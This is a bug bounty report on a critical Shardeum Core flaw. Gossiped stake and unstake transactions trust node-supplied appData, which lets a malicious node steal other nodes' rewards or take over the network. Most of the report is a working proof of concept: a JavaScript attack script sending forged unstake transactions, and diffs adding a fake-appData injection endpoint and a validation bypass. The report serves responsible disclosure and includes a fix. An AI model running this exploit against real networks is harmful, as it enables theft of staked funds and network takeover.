# 33922 - \[BC - Critical] Steal Rewards and Take over Network by Faking A...

Submitted on Aug 2nd 2024 at 01:19:16 UTC by @Blockian for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33922

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Direct loss of funds

## Description

## Impact

1. Steal other nodes' rewards
2. Create many nodes without staking any actual stake, thus taking over the network
3. Probably other stuff as well

## Root Cause

The root cause is that `txPreCrackData` isn't called for gossiped transactions, and so the `appData` and related staking data is trusted.

## Flow

### Stealing rewards

1. Innocent operator (`operator 1`) stakes a node (`node a`).
2. `node a` deserves a reward
3. Malicious operator (`attacker`) calls gossips an `unstake` transaction, with `appData` claiming to unstake `node a`.
4. The validation passes because it is done compared to a malicious `appData`.
5. `attacker` gets the reward.

### Taking over the network

1. Malicious node stakes one node
2. Malicious node stakes 100 nodes
   1. Shouldn't be possible, but is possible because it can fake the appData
3. Malicious node unstakes the first node, gets back all stake
4. Malicious node stakes one node
5. Now the malicious node can create an arbitrary amount of valid nodes, but with a stake that is worth only one node.
6. Can use this to take over the network.

## Deep Dive

The handler `spread_tx_to_group` (in <https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/state-manager/TransactionQueue.ts#L661-L661>) calls `handleSharedTX` (<https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/state-manager/TransactionQueue.ts#L1036-L1036>) which calls `validateTxnFields` with the fields supplied by the gossip (<https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/state-manager/TransactionQueue.ts#L1046-L1046>). These pass because they can be supplied by the gossiping malicious node. The transaction is queued, applied, and reaches: <https://github.com/shardeum/shardeum//blob/c7b10c2370028f7c7cbd2a01839e50eb50faa904/src/index.ts#L3772> Which takes the reward from the wrong node.

## Suggested Fix

`appData` should be populated the same way is it populated in `handleInject`, by calling `txPreCrackData`: <https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/shardus/index.ts#L1450-L1450> Which calls <https://github.com/shardeum/shardeum//blob/c7b10c2370028f7c7cbd2a01839e50eb50faa904/src/index.ts#L4705> To get the nominee and more, not allowing for the gossiping node to supply fake appData and staking related data.

## Severity

This lets node steal other nodes rewards, which is critical. It can also allow to crash nodes by:

* Unstaking a node that has more stakeLock than stake by operator, causing an underflow

Can also be used to take over the network, which is critical.

## Proof of concept

## POC

This POC introduces some changes to allow for a malicious node, but it shouldn't affect the behaviour of the innocent nodes. This POC shows how to steal rewards.

In order to run the POC, you need to:

* `shardus start 10`
* Start a `json-rpc-server`
* Call `node poc.js --rpc http://127.0.0.1:8080`

This is the `poc.js` file:

```js
const { ethers } = require("ethers");
const logger = require("./logger");
const { performance } = require("perf_hooks");
require("dotenv").config();
const { Command } = require("commander");
const { fromAscii } = require("@ethereumjs/util");

const program = new Command();

program.option("-r, --rpc <url>", "RPC provider URL").parse(process.argv);

const options = program.opts();

if (!options.rpc) {
  console.error("--rpc is required");
  process.exit(1);
}

const rpc = options.rpc;

const address1 = {
  eth: "0x5E5C3b702e99d7d920bc70C160106F8f98c1ba41",
  shardus: "5E5C3b702e99d7d920bc70C160106F8f98c1ba41000000000000000000000000",
  private: "0xEB4A7E99B7E46BD84D0573F4DD06B68CBE5B44192BFFAEA7DC66AAEC69CF00AC",
};

const address2 = {
  eth: "0xC35573abB9A03423B410F328559255C5F7407243",
  shardus: "C35573abB9A03423B410F328559255C5F7407243000000000000000000000000",
  private: "0x9A8E5819AAC250585B98CAECC6429D27466E2A183F8A0A2C787A7006EBCE903B",
};

const stake_to_address = "0x0000000000000000000000000000000000010000";

async function getAccountData(accountId) {
  const url = `http://localhost:9001/account-report?id=${accountId.toLowerCase()}`;

  try {
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error("Network response was not ok " + response.statusText);
    }
    const data = await response.text();
    return data;
  } catch (error) {
    console.error("Error fetching account balance:", error);
    return null;
  }
}
async function getAccountBalance(accountId) {
  return getNumberField("balance", accountId);
}
async function getAccountReward(accountId) {
  return getNumberField("reward", accountId);
}

async function getNumberField(field, accountId) {
  try {
    const data = await getAccountData(accountId);

    // Create a dynamic regex to find the specified field in the response text
    const fieldRegex = new RegExp(`"${field}":"(\\d+)"`);
    const fieldMatch = data.match(fieldRegex);

    if (fieldMatch && fieldMatch[1]) {
      return fieldMatch[1];
    } else {
      console.log(data);
      throw new Error(`${field} not found in account data`);
    }
  } catch (error) {
    console.error(`Error fetching account ${field}:`, error);
    return null;
  }
}

async function sendSpecificTransaction(tx, privateKey) {
  const provider = new ethers.providers.JsonRpcProvider(rpc);

  const wallet = new ethers.Wallet(privateKey, provider);

  const startTime = performance.now();

  try {
    const transactionResponse = await wallet.sendTransaction(tx);
    logger.info(`Transaction sent: ${transactionResponse.hash}`);

    const receipt = await transactionResponse.wait();
    if (receipt.status === 1) {
      logger.info(`Transaction succeeded!`);
    } else {
      logger.error(`Transaction failed!`);
    }

    const logData = {
      transactionHash: receipt.transactionHash,
      blockNumber: receipt.blockNumber,
      gasUsed: receipt.gasUsed.toString(),
      status: receipt.status,
    };

    logger.info(`Transaction details: ${JSON.stringify(logData)}`);
  } catch (error) {
    logger.error(`Error sending transaction: ${error}`);
  }

  const endTime = performance.now();
  const timeTaken = endTime - startTime;
  logger.info(`Total time taken for transaction: ${timeTaken.toFixed(2)} ms`);
}

async function sendStakeTransaction(
  amount,
  nominator,
  nominee,
  privateKey,
  stake_to = stake_to_address,
  fake_appdata = {}
) {
  const stake_data = {
    stake: amount,
    internalTXType: 6, // Stake
    nominee: nominee,
    nominator: nominator,
    fake_appdata: fake_appdata,
  };
  const stake_tx = {
    to: stake_to,
    value: BigInt(amount),
    data: fromAscii(JSON.stringify(stake_data)),
  };
  return sendSpecificTransaction(stake_tx, privateKey);
}

async function sendUnstakeTransaction(
  nominator,
  nominee,
  privateKey,
  fake_appdata = {}
) {
  const unstake_data = {
    internalTXType: 7, // Unstake
    nominee: nominee,
    nominator: nominator,
    fake_appdata: fake_appdata,
  };
  const unstake_tx = {
    to: stake_to_address,
    value: 0,
    data: fromAscii(JSON.stringify(unstake_data)),
  };
  return sendSpecificTransaction(unstake_tx, privateKey);
}

async function sendMaliciousStakeUnstakeToStealRewards() {
  // This is so that there is a staking account for address 2
  await sendStakeTransaction(
    10000000000000000000,
    address2.eth,
    "b".repeat(64),
    address2.private
  );

  // Check the stake of the innocent node
  const address1_initial_balance = BigInt(
    await getAccountBalance(address1.shardus)
  );
  console.log(`Address 1 account balance ${address1_initial_balance}`);

  // Check the balance of the malicious node
  const address2_initial_balance = BigInt(
    await getAccountBalance(address2.shardus)
  );
  console.log(`Address 2 account balance ${address2_initial_balance}`);

  // The innocent node stakes
  await sendStakeTransaction(
    10000000000000000000,
    address1.eth,
    "a".repeat(64),
    address1.private
  );
  console.log(
    `Address 1 account balance ${await getAccountBalance(address1.shardus)}`
  );
  console.log(
    `Address 2 account balance ${await getAccountBalance(address2.shardus)}`
  );
  console.log(`Address a reward ${await getAccountReward("a".repeat(64))}`);

  // The innocent node unstakes, this is to "hack" a reward, only for the POC
  await sendUnstakeTransaction(address1.eth, "a".repeat(64), address1.private, {
    hackReward: 414141414141414141,
  });
  console.log(
    `Address 1 account balance ${await getAccountBalance(address1.shardus)}`
  );
  console.log(
    `Address 2 account balance ${await getAccountBalance(address2.shardus)}`
  );
  console.log(`Address a reward ${await getAccountReward("a".repeat(64))}`);

  // The innocent node stakes
  await sendStakeTransaction(
    10000000000000000000,
    address1.eth,
    "a".repeat(64),
    address1.private
  );
  console.log(
    `Address 1 account balance ${await getAccountBalance(address1.shardus)}`
  );
  console.log(
    `Address 2 account balance ${await getAccountBalance(address2.shardus)}`
  );
  console.log(`Address a reward ${await getAccountReward("a".repeat(64))}`);

  // This is the attack transaction, the malicious node steals the reward from the innocent node
  await sendUnstakeTransaction(address2.eth, "a".repeat(64), address2.private, {
    skipPreCrackOfStake: true,
    internalTXType: 7,
    internalTx: {
      fake_appdata: { blahblah: 41414144 },
      internalTXType: 7,
      nominator: address2.eth,
      nominee: "a".repeat(64),
    },
    networkAccount: {
      accountType: 5,
      current: {
        activeVersion: "1.11.3",
        archiver: [Object],
        certCycleDuration: 30,
        description:
          "These are the initial network parameters Shardeum started with",
        latestVersion: "1.11.4",
        maintenanceFee: 0,
        maintenanceInterval: 86400000,
        minVersion: "1.11.3",
        nodePenaltyUsd: 10000000000000000000,
        nodeRewardAmountUsd: 1000000000000000000,
        nodeRewardInterval: 3600000,
        stabilityScaleDiv: 1000,
        stabilityScaleMul: 1000,
        stakeRequiredUsd: 10000000000000000000,
        title: "Initial parameters",
        txPause: false,
      },
      id: "1000000000000000000000000000000000000000000000000000000000000001",
      listOfChanges: [],
      next: {},
    },
    nominatorAccount: {
      account: {
        balance: 9999990990000000000000000,
        codeHash: [Uint8Array],
        nonce: 1,
        storageRoot: [Uint8Array],
      },
      accountType: 0,
      ethAddress: address2.eth,
      hash: "a2229a66d5e06806c768df310499f444395809c7f37f431d8a40a5e62cd42d56",
      operatorAccountInfo: {
        certExp: 0,
        nominee: "a".repeat(64),
        operatorStats: [Object],
        stake: 10000000000000000000,
      },
      timestamp: 1722274723389,
    },
    nomineeAccount: {
      accountType: 9,
      hash: "68799c1aa3c92c919e1d5ed32b26b03aaf4cc823bb0c6fee16ff2341d2faff0f",
      id: "a".repeat(64),
      nodeAccountStats: {
        history: [],
        isShardeumRun: false,
        lastPenaltyTime: 0,
        penaltyHistory: [],
        totalPenalty: 0,
        totalReward: 0,
      },
      nominator: address2.eth,
      penalty: 0,
      reward: 0,
      rewardEndTime: 0,
      rewardStartTime: 0,
      rewarded: false,
      stakeLock: { dataType: "bi", value: "8ac7230489e80000" },
      timestamp: 1722274723389,
    },
    requestNewTimestamp: true,
  });
  const address1_final_balance = BigInt(
    await getAccountBalance(address1.shardus)
  );

  console.log(`Address 1 account balance ${address1_final_balance}`);

  // The malicious node stakes again, to reclaim its locked stake
  await sendStakeTransaction(
    10000000000000000000,
    address2.eth,
    "b".repeat(64),
    address2.private
  );
  await sendUnstakeTransaction(address2.eth, "b".repeat(64), address2.private);

  // Calculate attack
  const address2_final_balance = BigInt(
    await getAccountBalance(address2.shardus)
  );

  console.log(`Address 2 account balance ${address2_final_balance}`);
  console.log(`Address a reward ${await getAccountReward("a".repeat(64))}`);

  if (address2_initial_balance <= address2_final_balance) {
    console.log(
      `Address 2 reward minus gas is ${
        address2_final_balance - address2_initial_balance
      }`
    );
  }
}

sendMaliciousStakeUnstakeToStealRewards();
```

This is the `json-rpc-server` git diff:

```
diff --git a/src/api.ts b/src/api.ts
index ec1363a..f3e542f 100755
--- a/src/api.ts
+++ b/src/api.ts
@@ -1,7 +1,7 @@
 import axios, { AxiosError } from 'axios'
 import WebSocket from 'ws'
 import { serializeError } from 'eth-rpc-errors'
-import { BN, bufferToHex, isHexPrefixed, isHexString, isValidAddress, keccak256 } from 'ethereumjs-util'
+import { BN, bufferToHex, isHexPrefixed, isHexString, isValidAddress, keccak256, toAscii, fromAscii } from 'ethereumjs-util'
 import {
   calculateInternalTxHash,
   getAccountFromValidator,
@@ -42,7 +42,7 @@ import { JSONRPCCallbackTypePlain, RequestParamsLike, JSONRPCError } from 'jayso
 import { readableBlock, completeReadableReceipt, readableTransaction } from './external/Collector'
 import { OriginalTxData, TransactionFromArchiver } from './types'
 import { isErr } from './external/Err'
-import { bytesToHex, toBytes } from '@ethereumjs/util'
+import { bytesToHex, hexToBytes, toBytes } from '@ethereumjs/util'
 import { RLP } from '@ethereumjs/rlp'
 import { nestedCountersInstance } from './utils/nestedCounters'
 import { trySpendServicePoints } from './utils/servicePoints'
@@ -511,13 +511,13 @@ export function recordTxStatus(txStatus: TxStatus): void {
   }
 }
 
-async function injectWithRetries(txHash: string, tx: any, args: any, retries = config.defaultRequestRetry) {
+async function injectWithRetries(txHash: string, tx: any, args: any, retries = config.defaultRequestRetry, fake_appdata = undefined) {
   let result: TransactionInjectionOutcome
   let retryCount = 0
   let exceptionCount = 0
   while (retryCount < retries) {
     try {
-      result = await injectAndRecordTx(txHash, tx, args)
+      result = await injectAndRecordTx(txHash, tx, args, fake_appdata)
       if (result.success) {
         return result
       } else if (result.reason === 'Node is too close to rotation edges. Inject to another node') {
@@ -556,7 +556,8 @@ async function injectAndRecordTx(
   // eslint-disable-next-line @typescript-eslint/no-explicit-any
   tx: any,
   // eslint-disable-next-line @typescript-eslint/no-explicit-any
-  args: any
+  args: any,
+  fake_appdata: any
 ): Promise<{
   nodeUrl: string
   success: boolean
@@ -630,6 +631,11 @@ async function injectAndRecordTx(
     injectEndpoint = `inject-with-warmup`
     injectPayload = { tx, warmupList }
   }
+  if (fake_appdata) {
+    injectEndpoint = `inject-fake-appdata`
+    injectPayload = { tx, fake_appdata }
+    console.log("inject-fake-appdata", injectPayload)
+  }
 
   if (verboseAALG) console.log('inject', injectEndpoint, 'warmup-access-list', usingWarmup)
 
@@ -1539,6 +1545,8 @@ export const methods = {
   },
   eth_sendRawTransaction: async function (args: RequestParamsLike, callback: JSONRPCCallbackTypePlain) {
     const api_name = 'eth_sendRawTransaction'
+    console.log(api_name)
+    console.log(args)
     nestedCountersInstance.countEvent('endpoint', api_name)
     if (!ensureArrayArgs(args, callback)) {
       countFailedResponse(api_name, 'Invalid params: non-array args')
@@ -1557,6 +1565,7 @@ export const methods = {
     let nodeUrl: string | undefined | Promise<string>
     let txHash = ''
     let gasLimit = ''
+    let fake_appdata = undefined
     try {
       const { isInternalTx } = args[0]
       let tx: OriginalTxData
@@ -1572,13 +1581,19 @@ export const methods = {
           raw,
         }
         if (config.generateTxTimestamp) tx.timestamp = now
-        const transaction = getTransactionObj(tx)
-
+        let transaction = getTransactionObj(tx)
+        let transactionData = JSON.parse(toAscii(bytesToHex(transaction.data)))
+        if (transactionData.fake_appdata) {
+            console.log(transactionData.fake_appdata)
+            fake_appdata = transactionData.fake_appdata
+        //     delete transactionData.fake_appdata
+        //     transaction.data = Buffer.from(hexToBytes(fromAscii(JSON.stringify(transactionData))))
+        }
         txHash = bufferToHex(transaction.hash())
         gasLimit = transaction.gasLimit.toString(16)
       }
 
-      injectWithRetries(txHash, tx, args)
+      injectWithRetries(txHash, tx, args, config.defaultRequestRetry, fake_appdata)
         .then((res) => {
           nodeUrl = res.nodeUrl
           if (res.success === true) {
diff --git a/src/utils.ts b/src/utils.ts
index c07e1f6..53c2a18 100644
--- a/src/utils.ts
+++ b/src/utils.ts
@@ -384,6 +384,7 @@ export function getTransactionObj(tx: OriginalTxData): Transaction | AccessListE
   }
 
   if (transactionObj) {
+    console.log(transactionObj)
     return transactionObj
   } else throw Error('tx obj fail')
 }

```

This is the `shardeum` diff:

```
diff --git a/src/config/genesis.json b/src/config/genesis.json
index 1d7df74..8a7ec6f 100644
--- a/src/config/genesis.json
+++ b/src/config/genesis.json
@@ -521,5 +521,23 @@
   },
   "0xe33BF2d6b28c6aC880cd81b5564A92a42593369d": {
     "wei": "10000001000000000000000000"
+  },
+  "0xd7E167AB2A4bC910619ACB0CC36B7707Ab8816d6": {
+    "wei": "10000001000000000000000000"
+  },
+  "0x33e5fFB075255D7Bb37A658c0EB31D46F752e03d": {
+    "wei": "10000001000000000000000000"
+  },
+  "0x3a77567FB2a8c84bC9003115c1977E4F2B8ad730": {
+    "wei": "10000001000000000000000000"
+  },
+  "0x5E5C3b702e99d7d920bc70C160106F8f98c1ba41": {
+    "wei": "10000000000000000000000000"
+  },
+  "0xC35573abB9A03423B410F328559255C5F7407243": {
+    "wei": "10000000000000000000000000"
+  },
+  "0x5B59bC16Ee5aa0b0a91a707c2cB979fB737eE6a1": {
+    "wei": "10000000000000000000000000"
   }
 }
diff --git a/src/config/index.ts b/src/config/index.ts
index 665bb88..9138144 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -130,10 +130,10 @@ if (process.env.APP_IP) {
 config = merge(config, {
   server: {
     p2p: {
-      cycleDuration: 60,
+      cycleDuration: 30,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 300, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 300,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
       maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1100,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
@@ -146,7 +146,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -306,11 +306,11 @@ config = merge(
   config,
   {
     server: {
-      mode: 'release', // todo: must set this to "release" for public networks or get security on endpoints. use "debug"
+      mode: 'debug', // todo: must set this to "release" for public networks or get security on endpoints. use "debug"
       // for easier debugging
       debug: {
-        startInFatalsLogMode: true, // true setting good for big aws test with nodes joining under stress.
-        startInErrorLogMode: false,
+        startInFatalsLogMode: false, // true setting good for big aws test with nodes joining under stress.
+        startInErrorLogMode: true,
         robustQueryDebug: false,
         fakeNetworkDelay: 0,
         disableSnapshots: true, // do not check in if set to false
diff --git a/src/index.ts b/src/index.ts
index e65a20d..4aea3ff 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -176,8 +176,8 @@ let profilerInstance
 
 //   next shardus core will export the correct type
 export let logFlags = {
-  verbose: false,
-  dapp_verbose: false,
+  verbose: true,
+  dapp_verbose: true,
   error: true,
   fatal: true,
   important_as_error: true,
@@ -1267,8 +1300,30 @@ const configShardusEndpoints = (): void => {
     await handleInject(tx, appData, res)
   })
 
+  // This is created to simulate a malicious node
+  shardus.registerExternalPost('inject-fake-appdata', externalApiMiddleware, async (req, res) => {
+    const id = shardus.getNodeId()
+    const isInRotationBonds = shardus.isNodeInRotationBounds(id)
+    if (isInRotationBonds) {
+      return res.json({
+        success: false,
+        reason: `Node is too close to rotation edges. Inject to another node`,
+        status: 500,
+      })
+    }
+    const { tx, fake_appdata } = req.body
+    let appData = null
+    if (fake_appdata != null) {
+      appData = fake_appdata
+    }
+    await handleInject(tx, appData, res)
+  })
+
   shardus.registerExternalGet('eth_blockNumber', externalApiMiddleware, async (req, res) => {
-    if (ShardeumFlags.VerboseLogs) console.log('Req: eth_blockNumber')
+    if (ShardeumFlags.VerboseLogs) { 
+      console.trace()
+        console.log('Req: eth_blockNumber')
+    }
     return res.json({ blockNumber: latestBlock ? '0x' + latestBlock.toString(16) : '0x0' })
   })
 
@@ -3817,6 +4022,7 @@ const shardusSetup = (): void => {
         nodeAccount2.timestamp = txTimestamp
         nodeAccount2.penalty = BigInt(0)
         nodeAccount2.reward = BigInt(0)
+        if (appData.hackReward) nodeAccount2.reward = BigInt(appData.hackReward)
         nodeAccount2.rewardStartTime = 0
         nodeAccount2.rewardEndTime = 0
         nodeAccount2.rewarded = false
@@ -4423,6 +4680,12 @@ const shardusSetup = (): void => {
         }
 
         const isStakeRelatedTx: boolean = isStakingEVMTx(transaction)
+        // This is created to fake a malicious node:
+        let skipPreCrackOfStake: boolean = false;
+        if (appData.skipPreCrackOfStake) {
+          skipPreCrackOfStake = true;
+          console.log(`Skipping pre crack of stake`);
+        }
 
         const isEIP2930 =
           transaction instanceof AccessListEIP2930Transaction && transaction.AccessListJSON != null
@@ -4694,7 +4999,7 @@ const shardusSetup = (): void => {
         }
 
         // crack stake related info and attach to appData
-        if (isStakeRelatedTx === true) {
+        if (isStakeRelatedTx === true && !skipPreCrackOfStake) {
           try {
             const networkAccountData: WrappedAccount = await shardus.getLocalOrRemoteAccount(networkAccount)
             appData.internalTx = getStakeTxBlobFromEVMTx(transaction)
diff --git a/src/shardeum/shardeumFlags.ts b/src/shardeum/shardeumFlags.ts
index ac80e04..e33b130 100644
--- a/src/shardeum/shardeumFlags.ts
+++ b/src/shardeum/shardeumFlags.ts
@@ -128,12 +128,12 @@ export const ShardeumFlags: ShardeumFlags = {
   contractStoragePrefixBitLength: 3,
   contractCodeKeySilo: false,
   globalCodeBytes: false,
-  VerboseLogs: false,
+  VerboseLogs: true,
   debugTraceLogs: false,
   Virtual0Address: true,
   GlobalNetworkAccount: true,
   FirstNodeRewardCycle: 100,
-  blockProductionRate: 6,
+  blockProductionRate: 3,
   initialBlockNumber: 0,
   maxNumberOfOldBlocks: 256,
   SelfTest: false,


```
